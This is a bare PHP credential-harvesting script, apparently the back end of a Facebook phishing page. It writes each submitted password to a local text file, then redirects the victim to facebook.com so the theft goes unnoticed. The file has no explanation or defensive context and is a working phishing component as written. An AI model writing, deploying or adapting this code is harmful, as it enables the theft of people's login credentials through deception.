<?php
file_put_contents("passwords.txt", "Password: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://facebook.com');
exit();